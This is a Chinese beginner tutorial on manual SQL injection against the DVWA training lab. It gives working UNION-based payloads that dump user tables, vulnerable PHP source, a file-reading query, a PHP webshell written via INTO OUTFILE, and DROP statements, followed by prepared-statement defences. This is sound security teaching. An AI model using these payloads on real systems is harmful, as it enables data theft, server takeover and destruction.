# 第10章 DVWA实战 - SQL注入入门 🎯

## 开篇引入：SQL注入是什么？🤔

哈喽，各位新手小伙伴们！欢迎来到第10章的学习！今天我们要聊的话题，可以说是Web安全界的"老牌明星"——**SQL注入**。这玩意儿从上个世纪末就开始火了，到了2026年依然是OWASP Top 10的常客，足以说明它的重要性！

### 先讲个生活小例子 🏪

你有没有去过那种老式的图书馆？图书馆里有个管理员，你告诉管理员书名，他就去帮你找书。

正常流程是这样的：
- 你说："帮我找《西游记》"
- 管理员重复一遍："好的，我去书架找《西游记》"
- 然后他就把书给你拿来了 ✅

但是呢，如果你是个"坏孩子"，你跟管理员说：
> "帮我找《西游记》，顺便把所有书架上的书都给我抱出来"

如果管理员脑子不太好使，真的把你说的话原封不动地当成命令执行了...那后果就严重了！他不仅给你找了《西游记》，还把整个图书馆的书都搬出来了！😱

SQL注入就是这么回事儿！你输入的内容里夹带了"私货"，数据库没分清哪些是数据、哪些是命令，稀里糊涂就把你的"私货"也当成代码执行了。

### 再举个更贴近生活的例子 📝

假设你去银行取钱，你跟柜员说：
- "我要取100块钱"
- 柜员操作：取100块 → 给你钱

但是如果你说：
- "我要取100块钱，顺便把我账户里的钱都改成9999999"

如果柜员真照做了...那银行不就亏大了？🤣

当然现实中的银行柜员不会这么傻，但很多网站的"数据库管理员"（程序员写的代码）还真就这么傻！

---

## SQL是什么？简单科普一下 📚

在讲SQL注入之前，我们得先搞明白：**SQL到底是个啥？**

### 数据库就像一个大仓库 🏭

你可以把数据库想象成一个超大的仓库，这个仓库里有很多货架（表），每个货架上摆着很多箱子（行），每个箱子里装着不同的东西（字段）。

比如说，一个网站的用户数据库：
- 仓库名：用户数据库
- 货架名：users（用户表）
- 每个箱子（每行）代表一个用户
- 箱子里的东西（字段）：用户名、密码、邮箱、手机号...

### SQL就是和仓库管理员对话的语言 💬

SQL的全称是**Structured Query Language**（结构化查询语言），说白了就是一套和数据库"对话"的标准语言。

你想从数据库里拿数据、改数据、删数据，都得用SQL跟它说。

### 常见的数据库有哪些？🗄️

就像仓库有不同品牌一样，数据库也有很多种：

- **MySQL**：最流行的开源数据库，很多网站都用它，PHP的黄金搭档 🌟
- **SQL Server**：微软家的，Windows服务器常用
- **Oracle**：大企业用得多，贼贵但功能强
- **PostgreSQL**：另一个开源选择，功能也很强大
- **SQLite**：轻量级的，手机App常用

我们DVWA用的就是MySQL，所以今天主要聊MySQL的注入。

### 最简单的SQL语句长啥样？👀

来，我们看一个最最最简单的SQL语句：

```sql
SELECT * FROM users WHERE id = 1;
```

啥意思呢？大白话翻译一下：
- `SELECT *` → 把所有东西都给我拿出来
- `FROM users` → 从users这个货架上拿
- `WHERE id = 1` → 只要那个编号是1的箱子

是不是很好理解？就相当于你跟仓库管理员说："去users货架上，把id是1的那个箱子里所有东西都给我拿来！"

---

## SQL注入原理：为啥会出问题？🔍

好了，基础概念讲完了，现在进入正题：**SQL注入到底是怎么发生的？**

### 大白话解释 💡

SQL注入的本质就是：
> **用户输入的数据，被当成了SQL代码的一部分去执行了！**

正常情况下，用户输入的内容应该只是"数据"，比如用户名、ID号这些。但是如果程序员写代码的时候不小心，把用户输入的东西直接拼到SQL语句里了，那就出大事了！

### 为什么会有注入？程序员的锅？🍳

对，你没听错，SQL注入本质上就是**代码写得有问题**。

我们来看一个"反面教材"：

假设网站有个功能，用户输入一个ID，就能查到对应的用户信息。

程序员写的代码可能是这样的（PHP语言举例子）：

```php
$id = $_GET['id'];  // 从URL获取用户输入的id
$sql = "SELECT * FROM users WHERE id = " . $id;  // 直接拼到SQL里！
$result = mysql_query($sql);  // 执行SQL
```

看到问题了吗？用户输入的`$id`被直接拼到SQL语句里了！

如果用户输入的是`1`，那SQL就是：
```sql
SELECT * FROM users WHERE id = 1
```
这没问题，很正常 ✅

但如果用户输入的是`1 OR 1=1`呢？那SQL就变成了：
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```
我去！这就不对了！`OR 1=1`是永远成立的条件，结果就是把所有用户都查出来了！😱

这就是SQL注入！用户输入的"数据"变成了"代码"的一部分！

### 注入的三个前提条件 🎯

不是所有地方都能SQL注入的，得满足这几个条件：

1. **用户输入可控** → 你能修改输入的内容（比如URL参数、表单输入框）
2. **输入被拼接到SQL语句里** → 你的输入会被放进SQL语句中
3. **拼接后能成功执行** → 数据库真的会执行这条拼出来的SQL

三个条件缺一不可，少一个都注入不了。

---

## SQL语句小课堂：新手必备基础 📖

在去DVWA实战之前，我们先补几个最常用的SQL语句，不用记太多，够用就行！

### 1. SELECT：查询数据 🔍

最常用的就是SELECT了，用来从数据库里查数据。

```sql
-- 查users表的所有字段
SELECT * FROM users;

-- 只查username和password两个字段
SELECT username, password FROM users;

-- 加条件查询
SELECT * FROM users WHERE id = 1;
```

就像去仓库拿东西，SELECT就是告诉管理员"拿什么"，FROM就是"从哪拿"，WHERE就是"拿哪个"。

### 2. UNION：联合查询 🔗

UNION可以把两个SELECT查询的结果拼在一起。

```sql
SELECT username FROM users WHERE id = 1
UNION
SELECT password FROM users WHERE id = 2;
```

这就好比你先从第一个货架拿了一个苹果，又从第二个货架拿了一个梨，然后把它们放在同一个袋子里给你。

**注意**：UNION要求两个查询的**字段数必须一样多**，不然会报错。这一点很重要，后面会用到！

### 3. ORDER BY：排序 ↕️

ORDER BY用来给查询结果排序。

```sql
-- 按id从小到大排序
SELECT * FROM users ORDER BY id;

-- 按第2列排序
SELECT * FROM users ORDER BY 2;
```

哎？`ORDER BY 2`是什么鬼？意思是按查询结果的第2列来排序。

这个有啥用呢？嘿嘿，它可以帮我们**猜这个表有多少个字段**！

比如：
- `ORDER BY 1` → 按第1列排序，成功，说明至少有1个字段
- `ORDER BY 2` → 按第2列排序，成功，说明至少有2个字段
- `ORDER BY 3` → 按第3列排序，报错！说明只有2个字段！

是不是很聪明？这就是手工注入的常用技巧！🧠

### 4. 注释符号：-- 和 # 💭

在SQL里，`--`（两个减号后面跟个空格）和`#`都是注释符号，注释后面的内容会被忽略。

```sql
SELECT * FROM users WHERE id = 1 -- 这后面的都被忽略了
```

这个在注入的时候特别有用！我们可以用注释把原来SQL语句后面的东西给"弄没"，让我们自己写的SQL能正常执行。

**小技巧**：在URL里，`--+`经常被用来表示`-- `（因为+在URL里会被解码成空格）。

### 5. 几个好用的MySQL函数 🛠️

MySQL里有一些内置函数，注入的时候特别好用：

| 函数名 | 作用 |
|--------|------|
| `database()` | 当前数据库名 |
| `version()` | MySQL版本 |
| `user()` | 当前数据库用户 |
| `@@datadir` | 数据库路径 |
| `group_concat()` | 把多行结果拼成一行 |

先记住`database()`、`version()`、`user()`这三个，后面马上就用得上！

---

## 准备工作：进入DVWA 🚀

好了，理论知识差不多了，我们来实战！

首先确保你已经：
1. 启动了PHPStudy（或者你的Web环境）
2. 登录了DVWA（默认账号admin，密码password）
3. 把DVWA Security设置为**Low**级别（左边菜单栏 → DVWA Security）

然后点击左边菜单栏的 **SQL Injection**，我们就进入SQL注入模块了！

你会看到一个输入框，提示"Enter a User ID"，还有一个Submit按钮。

---

## Low级别通关：手把手教你注入 🎮

### 第一步：正常输入，看看返回啥 👀

我们先在输入框里输入 `1`，点击Submit。

你会看到返回了：
- ID: 1
- First name: admin
- Surname: admin

好，很正常，这就是id为1的用户信息。

再试试输入 `2`：
- ID: 2
- First name: Gordon
- Surname: Brown

没问题，这是id为2的用户。

### 第二步：输入单引号，试探一下 🕵️

现在是关键的一步！我们输入一个单引号 `'`，然后Submit。

哎？报错了！你会看到类似这样的错误信息：
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

**恭喜你！发现注入点了！** 🎉

为什么输入单引号会报错呢？因为原来的SQL语句大概是这样的：
```sql
SELECT * FROM users WHERE id = '$id'
```

当我们输入 `'` 的时候，SQL就变成了：
```sql
SELECT * FROM users WHERE id = '''
```
看到没？多出来的单引号把SQL语句的结构给破坏了，所以数据库就报错了！

这就叫**基于报错的注入**，通过错误信息我们能判断这里存在SQL注入。

### 第三步：判断注入类型：字符型还是数字型？🤔

注入主要分两种类型：
- **数字型**：`WHERE id = 1`（id没有引号包裹）
- **字符型**：`WHERE id = '1'`（id有引号包裹）

怎么判断呢？我们可以试试输入 `1' and '1'='1` 和 `1' and '1'='2`。

先输入 `1' and '1'='1`：
- 返回正常，显示admin的信息 ✅

再输入 `1' and '1'='2`：
- 返回空，啥都没有 ❌

这说明什么？说明是**字符型注入**！因为我们用单引号把前后的引号都闭合上了。

如果还不太明白，我们来分析一下：

输入 `1' and '1'='1` 时，SQL变成了：
```sql
SELECT * FROM users WHERE id = '1' and '1'='1'
```
`'1'='1'` 是真的，所以条件成立，能查到数据。

输入 `1' and '1'='2` 时，SQL变成了：
```sql
SELECT * FROM users WHERE id = '1' and '1'='2'
```
`'1'='2'` 是假的，所以条件不成立，查不到数据。

完美！确认是字符型注入！✅

### 第四步：用ORDER BY猜字段数 🔢

现在我们知道是字符型注入了，接下来要搞清楚：这个查询到底查了几个字段？

这时候就用到我们前面学的ORDER BY了！

我们来试试：
- 输入 `1' order by 1--+` → 成功，显示数据 ✅
- 输入 `1' order by 2--+` → 成功，显示数据 ✅
- 输入 `1' order by 3--+` → 报错了！❌

报错信息大概是：
```
Unknown column '3' in 'order clause'
```

**说明什么？说明这个查询只有2个字段！** 🎯

我们来解释一下 `1' order by 2--+` 这个payload：
- `1'` → 闭合前面的单引号
- `order by 2` → 按第2列排序
- `--+` → 注释掉后面的东西（包括后面那个单引号）

拼起来SQL就是：
```sql
SELECT * FROM users WHERE id = '1' order by 2-- '
```
后面的 `'` 被注释掉了，所以不会报错，完美！😎

### 第五步：用UNION SELECT找显示位 🔍

既然知道了有2个字段，那我们就可以用UNION来联合查询了！

先试试这个：
```
1' union select 1,2--+
```

哎？怎么还是只显示id=1的用户？因为页面只显示第一条查询结果啊！

那我们让第一条查不到不就行了？把1改成一个不存在的id，比如-1：
```
-1' union select 1,2--+
```

哇！你会看到页面显示：
- First name: 1
- Surname: 2

**太棒了！这就是显示位！** 🎉

意思是：
- 第1个字段的内容会显示在First name的位置
- 第2个字段的内容会显示在Surname的位置

以后我们想查什么数据，就把它放在对应的位置上就行了！

### 第六步：爆数据库名 💥

先来个简单的，我们查一下当前数据库叫什么名字。

用我们前面学的`database()`函数！把它放在第2位上：
```
-1' union select 1,database()--+
```

返回结果：
- First name: 1
- Surname: dvwa

**数据库名是dvwa！** 是不是很简单？😆

再来几个试试，看看版本和用户：
```
-1' union select version(),user()--+
```

哇，一下子能查到好多信息！

### 第七步：爆表名 📋

知道了数据库名，接下来我们要查这个库里有哪些表。

这里要用到MySQL里的一个特殊库：**information_schema**。

这是MySQL自带的一个"数据字典"库，里面存着所有数据库、表、字段的信息。可以理解为"仓库的仓库目录"！📚

爆表名的语句是这样的：
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwa'
```

什么意思呢？
- 从information_schema库里的tables表（这是存所有表名的表）
- 查table_schema（数据库名）是'dvwa'的所有table_name（表名）

好，我们把它放到UNION里：
```
-1' union select 1,table_name FROM information_schema.tables WHERE table_schema='dvwa'--+
```

等等，不对啊，这样只能显示一个表名啊！因为页面只显示一行结果...

没关系！我们用`group_concat()`函数，把所有表名拼成一行显示：
```
-1' union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa'--+
```

返回结果你会看到类似：
```
guestbook,users
```

**太棒了！dvwa库里有两个表：guestbook和users！** 🎊

users表！一听就知道里面存的是用户账号密码！我们来爆它！

### 第八步：爆字段名 🏷️

知道了表名，接下来要查表里有哪些字段。

同样用information_schema，这次用columns表：
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa'
```

还是用group_concat拼起来：
```
-1' union select 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+
```

返回结果：
```
user_id,first_name,last_name,user,password,avatar,last_login,failed_login
```

哇塞！字段真多！我们看到了什么？**user和password！** 这不就是用户名和密码吗？！🤩

### 第九步：爆数据！脱库！💣

终于到最激动人心的时刻了！我们来把所有用户名和密码都查出来！

```
-1' union select user,password FROM users--+
```

等等，这样只能显示一个用户对吧？用group_concat！

```
-1' union select group_concat(user),group_concat(password) FROM users--+
```

或者我们也可以用`concat()`把用户名和密码拼在一起，更清楚：
```
-1' union select 1,group_concat(user,0x3a,password) FROM users--+
```

（0x3a是冒号的十六进制，这样用户名和密码之间用冒号隔开，看得更清楚）

返回结果大概是这样的：
```
admin:21232f297a57a5a743894a0e4a801fc3,gordonb:e99a18c428cb38d5f260853678922e03,1337:8d3533d75ae2c3966d7e0d4fcc69216b,...
```

**成功脱库！所有用户名和密码都拿到了！** 🎉🎉🎉

不过等等，密码怎么是一堆乱七八糟的字母数字？这是因为密码是经过MD5加密的，不是明文的。没关系，我们可以去MD5解密网站（比如cmd5.com）查一下，或者用工具跑一下。

比如admin的密码`21232f297a57a5a743894a0e4a801fc3`，解密后就是`admin`。

### Low级别源代码分析 🔬

好了，Low级别我们通关了，现在来看看源代码，学学为什么会有注入。

点击页面右下角的"View Source"，就能看到源代码了：

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i = 0;
    while( $i < $num ) {
        // Get values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        // Increase loop count
        $i++;
    }

    mysql_close();
}

?> 
```

看到问题在哪了吗？就是这一行：
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

用户输入的`$id`直接被拼到SQL语句里了！一点过滤都没有！这不是等着被注入吗？🤦‍♂️

而且还有这一行：
```php
$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
```
出错了直接把MySQL的错误信息显示出来，这等于给攻击者送情报啊！

---

## Medium级别：稍微有点难度了 🎯

好了，Low级别太简单了，简直是送分题。现在我们把DVWA Security改成**Medium**，再来试试！

### 第一步：试试Low的方法还行不行？🤔

先输入个 `1`，正常显示。

再输入个 `1'`，哎？怎么不报错了？反而显示了个错误提示：
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
```

嗯？单引号被转义了？前面多了个反斜杠 `\'`？

不对，等等，我们再仔细看看Medium级别的SQL Injection页面...哎？怎么输入框没了？变成下拉菜单了？😮

哈哈，对！Medium级别把输入框改成了下拉选择框，你只能选1、2、3、4、5，不能自己输入了！

但是！这就能挡住我们吗？太天真了！😏

### 第二步：抓包改参数！🕸️

下拉框只是前端的限制，我们可以抓包修改参数啊！

你可以用Burp Suite抓包，或者更简单的——直接改URL！

我们选1提交，看看URL变成啥了：
```
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

看到没？参数在URL里呢！`id=1`，我们直接改URL不就行了！

好，我们在URL里试试输入单引号：
```
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit
```

哎？还是报错，错误信息里有`\'`，说明单引号被转义了（加了反斜杠）。

那我们试试不用单引号行不行？

### 第三步：判断注入类型 🧐

我们来试试数字型注入的方法。因为如果是数字型的话，根本不需要单引号！

试试输入：
```
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 and 1=1&Submit=Submit
```
正常显示 ✅

再试试：
```
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 and 1=2&Submit=Submit
```
不显示了 ❌

**完美！这就是数字型注入！** 🎉

为什么呢？因为Medium级别把id转换成数字了，SQL语句大概是这样的：
```sql
SELECT * FROM users WHERE id = $id
```
id没有引号包裹，所以是数字型注入，我们直接写SQL语句就行，不需要单引号！

### 第四步：接下来就和Low级别差不多了！🚀

既然是数字型注入，那流程就和Low级别一样了，只是payload里不用加单引号了！

来，直接上：

**猜字段数：**
```
?id=1 order by 2-- -
```
（注意：这里用-- -而不是--+，因为+在URL里的问题，用-- -更保险，后面那个减号会被当成负号忽略）

**找显示位：**
```
?id=-1 union select 1,2-- -
```

**爆数据库名：**
```
?id=-1 union select 1,database()-- -
```

**爆表名：**
```
?id=-1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
```
（这里用database()代替'dvwa'，因为单引号被转义了，用函数就不用引号了！聪明吧？🧠）

**爆字段名：**
```
?id=-1 union select 1,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273-- -
```
（注意：table_name='users'需要单引号，但单引号被转义了怎么办？我们把users转成十六进制！0x7573657273就是'users'的十六进制，这样就不用引号了！😎）

**爆数据：**
```
?id=-1 union select group_concat(user),group_concat(password) FROM users-- -
```

搞定！Medium级别也拿下了！💪

### Medium级别源代码分析 🔬

来看看Medium级别的源码：

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysql_real_escape_string( $id );

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i = 0;
    while( $i < $num ) {
        // Display values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        // Increase loop count
        $i++;
    }

    mysql_close();
}

?> 
```

来分析一下它做了什么防护：

1. **用了mysql_real_escape_string()**：这个函数会转义单引号、双引号等特殊字符，所以我们的单引号不好使了
2. **把输入改成了POST方式**：前端是下拉菜单，以为这样就安全了
3. **但是！SQL语句里id没有用引号包裹！**：`WHERE user_id = $id;`，这是数字型的啊！

哈哈，这防护等于做了一半！虽然转义了单引号，但是数字型注入根本不需要单引号啊！🤣

这就是典型的"以为加了过滤就安全了，但其实过滤得不对"。

---

## High级别：更难一点？没关系！🔥

好，继续升级！把DVWA Security改成**High**级别！

### 第一步：先试试之前的方法 🔍

哎？High级别又变了！这次不是下拉菜单了，又变回输入框了？但是...怎么是个弹窗？

点一下"Click here to change your ID"，弹出一个新窗口让你输入ID。

没关系，我们先试试输入 `1'`，看看有没有注入。

输入 `1'`，报错了！好，有注入点！✅

再试试 `1' order by 2--+`，正常！

`1' order by 3--+`，报错！好，还是2个字段。

`-1' union select 1,2--+`，哎？怎么不行了？只显示第一个？

不对，再仔细看看...哦！High级别加了LIMIT！

### 第二步：LIMIT是什么？怎么绕过？🤔

LIMIT是用来限制返回行数的，比如`LIMIT 1`就是只返回第一条结果。

High级别的SQL大概是这样的：
```sql
SELECT * FROM users WHERE id = '$id' LIMIT 1;
```

那我们的UNION注入后面有个LIMIT 1咋办？

简单！我们可以用注释把LIMIT也给注释掉啊！😏

等等，但是我们已经用了`--+`注释后面的内容了，那LIMIT应该被注释掉了啊？

我们来仔细看看。High级别可能有什么不同？让我们看看源码...

等等，先不着急看源码，我们来试试。High级别是在一个新窗口里提交的，它会不会是从SESSION里取值？或者做了其他防护？

我们先试试注入：

```
1' AND 1=1--+
```
正常显示 ✅

```
1' AND 1=2--+
```
不显示 ❌

好，确认是字符型注入。那我们来试试UNION：

```
-1' UNION SELECT 1,2--+
```

咦？好像不行？只显示ID，不显示其他的？

不对，等等，可能我记错了。让我们换个思路，High级别可能加了LIMIT，那我们能不能在LIMIT上做文章？

或者...我们可以用`PROCEDURE ANALYSE()`？不对，那个是别的东西。

等等，其实最简单的办法就是——我们的注释已经把LIMIT注释掉了啊！因为`--+`后面的所有内容都会被忽略，包括LIMIT 1。

让我们再试一次，可能我刚才输错了：

```
-1' union select 1,database()--+
```

哎？真的可以！我刚才看错了！😂

那High级别到底"高"在哪了？让我们看看源代码就知道了。

### 第三步：High级别源代码分析 🔬

点击View Source看High级别的源码：

```php
<?php

if( isset( $_SESSION[ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i = 0;
    while( $i < $num ) {
        // Get values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        // Increase loop count
        $i++;
    }

    mysql_close();
}

?> 
```

哦！原来如此！High级别做了这几点变化：

1. **把id存在了SESSION里**：通过另一个页面提交，然后存在SESSION中，以为这样就能防止SQL注入了（其实并没有，SESSION里的值也是用户输入的啊！🤦‍♂️）
2. **加了LIMIT 1**：以为加了LIMIT就只能返回一条结果了（但我们用注释把LIMIT干掉了啊！）
3. **错误信息变模糊了**：`die( '<pre>Something went wrong.</pre>' )`，不再显示具体的MySQL错误了

所以High级别其实和Low级别差不多，只是：
- 换了个提交方式（SESSION）
- 加了个LIMIT 1（被注释绕过）
- 错误信息不详细了（但我们还是能做注入）

说白了，防护都没做到点子上！😅

### 那LIMIT到底怎么绕过？🤔

虽然这里我们用注释直接绕过了LIMIT，但有些情况下注释不好使怎么办？

这里给大家科普几个绕过LIMIT的方法：

**方法1：用注释（最简单）**
```
1' --+
```
直接把LIMIT注释掉，就像我们刚才做的那样。

**方法2：用UNION自己加LIMIT**
如果注释不行，可以在UNION后面也加LIMIT，不过通常没必要。

**方法3：用PROCEDURE**
这个比较高级，新手暂时不用了解。

总之，在DVWA的High级别里，我们用注释就轻松绕过了！💪

---

## Impossible级别：真的不可能注入吗？🛡️

好了，来到了最高级别——Impossible！我们来看看它有多厉害！

### 第一步：先试试注入？🕵️

先输入个 `1`，正常显示。

输入个 `1'`，哎？不报错了？显示的是：
```
User ID: 1'
First name: ?
Surname: ?
```

嗯？好像查不到，但也没报错。

再试试 `1' or '1'='1`，也只显示ID是`1' or '1'='1`，查不到数据。

哎？这是咋回事？难道真的注入不了了？

### 第二步：源代码分析：预编译语句！🔬

直接看Impossible的源码吧，它用了什么黑科技？

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

哇！这代码看起来就很不一样！我们来分析一下它做了什么防护：

#### 1. 用了PDO预编译语句（最重要！）⭐

```php
$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
$data->bindParam( ':id', $id, PDO::PARAM_INT );
$data->execute();
```

这就是**预编译语句（Prepared Statements）**，也叫参数化查询。

什么意思呢？大白话讲就是：
- 先把SQL语句的"骨架"准备好，用`:id`当占位符
- 然后把用户输入的`$id`绑定到这个占位符上
- 数据库会严格区分"SQL代码"和"数据"，用户输入的内容永远只能当数据用，不会被当成代码执行

就好比你去图书馆，管理员先把规则定死了："你只能说书名，别的我都不听"。你再说什么"顺便把所有书都给我"，管理员也只当是书名的一部分，不会真的去搬所有书。

这就是从根本上解决了SQL注入问题！✅

#### 2. 用is_numeric()判断输入是不是数字

```php
if(is_numeric( $id )) {
```
先判断用户输入的是不是数字，不是数字根本不往下执行。双重保险！

#### 3. 加了Anti-CSRF token

还加了CSRF防护，防止跨站请求伪造。虽然和SQL注入没关系，但说明代码写得很规范。

#### 4. 用rowCount()判断只返回一条结果

```php
if( $data->rowCount() == 1 ) {
```
确保只返回一条结果，即使有什么问题也不会泄露太多数据。

### 为什么预编译能防注入？🤔

这是个好问题！我们来深入理解一下。

**传统方式（有注入风险）：**
```php
$sql = "SELECT * FROM users WHERE id = " . $id;
mysql_query($sql);
```
这种方式是先把SQL语句拼好，然后整个发给数据库执行。数据库拿到什么就执行什么，根本分不清哪些是用户输入的，哪些是SQL代码。

**预编译方式（安全）：**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id);
$stmt->execute();
```
这种方式分两步：
1. 先把SQL语句模板发给数据库，数据库提前"编译"好，确定了SQL的结构
2. 再把参数发过去，数据库只是把参数填进去，参数再怎么折腾也改变不了SQL的结构

就好比：
- 传统方式：你让机器人去拿东西，你说的每一句话机器人都当真，你说"顺便把店砸了"它可能真砸
- 预编译方式：你先告诉机器人"你只能做拿东西这件事，东西的名字我等下告诉你"，然后你再告诉它东西的名字，它就算听到"砸店"也只当是东西的名字，不会真去砸

所以说，**预编译是防御SQL注入的最佳方案，没有之一！** 🏆

---

## SQL注入能做什么？危害有多大？💀

说了这么多，你可能会问：SQL注入到底能造成多大危害？

我只能说：**非常大！大到你无法想象！** 😱

### 1. 脱库：把所有数据都偷走 📦

这个我们已经演示过了，就是把数据库里的所有数据都查出来。

- 用户账号密码 → 撞库攻击、盗号
- 用户手机号、邮箱 → 诈骗、垃圾短信
- 身份证、银行卡 → 直接财产损失
- 企业机密数据 → 商业间谍、勒索

一个严重的SQL注入漏洞，可能导致整个公司的数据被一锅端！

### 2. 读写文件：把你的服务器当硬盘用 📂

在某些情况下（比如数据库权限够大），SQL注入还能读写服务器上的文件。

**读文件：**
```sql
SELECT load_file('/etc/passwd')
```
（Linux下读密码文件，Windows下可以读配置文件）

**写文件：**
```sql
SELECT '<?php eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
```
直接往网站目录写一个webshell！

### 3. 拿Shell：控制整个服务器 💻

如果运气好（或者说运气不好），数据库权限很大，甚至可以直接执行系统命令。

比如：
- MySQL的UDF（用户自定义函数）提权
- SQL Server的xp_cmdshell
- Oracle的各种提权手段

一旦拿到了服务器权限，那整个服务器就都是你的了，想干嘛干嘛...

### 4. 删库跑路：最恶劣的情况 💥

最狠的就是直接把数据库删了！

```sql
DROP TABLE users;
DROP DATABASE dvwa;
```
数据全没了！如果没有备份的话，公司可能直接就倒闭了...

所以说，SQL注入是非常非常严重的漏洞，一定不能小看！⚠️

---

## 防御方法：怎么防SQL注入？🛡️

既然SQL注入这么危险，那我们该怎么防御呢？

### 1. 预编译语句（首选方案）⭐⭐⭐

这个我们前面讲过了，就是用PDO、Prepared Statements这种参数化查询。

**PHP例子：**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

**Java例子（JDBC）：**
```java
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, id);
ResultSet rs = pstmt.executeQuery();
```

**Python例子（pymysql）：**
```python
sql = "SELECT * FROM users WHERE id = %s"
cursor.execute(sql, (id,))
```

只要用了预编译，基本上就能杜绝99.9%的SQL注入！

### 2. 输入验证和过滤 🚦

除了预编译，最好还要做输入验证：

- **白名单验证**：比如id必须是数字，那就用`is_numeric()`或者正则判断
- **黑名单过滤**：过滤掉一些危险字符（不推荐作为主要防御手段，因为很容易被绕过）

但要记住：**过滤只是辅助，预编译才是根本！** 不要以为加了个过滤就安全了，很多WAF都能被绕过呢。

### 3. 最小权限原则 🔒

数据库账号的权限不要给太大！

- 网站用的数据库账号，只给它SELECT、INSERT、UPDATE这些必要的权限
- 千万不要用root账号连网站的数据库！
- 文件读写、执行命令这些权限，统统关掉

这样就算真的被注入了，危害也能降到最低。

### 4. 错误信息不回显 🙈

不要把数据库的具体错误信息显示给用户！

**错误示范：**
```php
mysql_query($sql) or die(mysql_error());
```
直接把MySQL错误打出来，等于给攻击者送情报。

**正确做法：**
```php
mysql_query($sql) or die("系统错误，请稍后再试");
```
只给个模糊的提示就行，具体错误写日志里。

### 5. 使用WAF（Web应用防火墙）🛡️

可以在前面加一层WAF，比如：
- 云锁、安全狗（国产的）
- ModSecurity（开源的）
- 云厂商的WAF（阿里云、腾讯云啥的）

WAF能挡住很多常见的攻击，但也不是万能的，高手还是能绕过。所以WAF只能作为**锦上添花**，不能当主要防御手段。

### 总结一下防御优先级：

1. **必须做**：预编译语句（参数化查询）
2. **应该做**：输入验证、最小权限、错误信息不回显
3. **可选做**：WAF、代码审计、安全测试

---

## 新手常见问题FAQ ❓

### Q1：SQL注入和XSS有啥区别？🤔

**A：** 完全不是一回事儿！
- SQL注入：把SQL代码注入到数据库里，攻击的是**数据库**
- XSS：把JavaScript代码注入到页面里，攻击的是**用户的浏览器**

简单记：SQL注入搞数据库，XSS搞用户。

### Q2：手工注入好麻烦，有没有工具可以自动注入？🤖

**A：** 有！最有名的就是**sqlmap**，Python写的，功能超级强大，基本能自动搞定所有SQL注入。

但是！新手一定要先学会手工注入，再用工具！不然你连原理都不懂，用工具也是瞎用，出了问题都不知道为啥。

就好比学开车，得先学会手动挡，再开自动挡，对吧？🚗

### Q3：是不是所有网站都有SQL注入？🌐

**A：** 当然不是！现在大家安全意识都提高了，正规网站基本都用框架，框架默认就用预编译，所以注入漏洞比以前少多了。

